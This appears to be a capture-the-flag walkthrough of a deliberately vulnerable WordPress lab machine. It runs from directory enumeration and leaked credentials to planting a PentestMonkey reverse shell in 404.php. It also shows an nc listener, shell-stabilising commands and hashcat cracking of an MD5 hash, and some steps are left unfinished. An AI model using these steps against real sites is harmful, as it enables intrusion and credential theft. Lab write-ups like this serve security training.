While visiting this site, I’ll be running it through a Proxy with BurpSuite

Manual search

Through manual exploration of the page BurpSuite picked up on some word press dependencies. Implying the site is running a word press blog.

I first noticed this by the appearance of wp-login.php

This would let us run a wpscan against the site

Further, visiting robots.txt shows

Shows we can find the first key at http://10.10.152.177/key-1-of-3.txt

Additionally, we can download a .dic file by visiting http://10.10.152.177/fsocity.dic

Inspecting this file seems to give us a wordlist

Automated search

gobuster dir -u http://10.10.152.177 -w /usr/share/wordlists/dirb/common.txt

Visiting /license.txt and scrolling down reveals a base64 encoded string

elliot:ER28-0652

These are possible credentials

Wordpress dashboard

With the found credentials in license.txt we can login to the wordpress dashboard at /wp-login.php

wpscan --url http://10.10.152.177 --api_token=<API_TOKEN>

This means we might be able to upload a webshell and then create a reverse shell with our attacking machine

We can edit the 404.php page to create the webshell

I’ve replaced the contents of the 404.php file with the PHP PentestMonkey reverse shell

Creating a listener on our attacking machine

nc -lvnp 2727

Then visiting /404.php

Stabilising the shell

  1. python3 -c 'import pty;pty.spawn("/bin/bash")'
  1. export TERM=xterm
  1. Background the shell with CTRL + Z
  1. stty raw -echo; fg

This seems to be the login credentials for robot, with their password hashed with MD5

We can use hashcat to crack this

hashcat -m 0 robot-pass.hash /usr/share/wordlists/rockyou.txt
  • -m 0 Means our algorithm to use is MD5
  • -a 0 is our attack method, 0 being

We find the password for robot
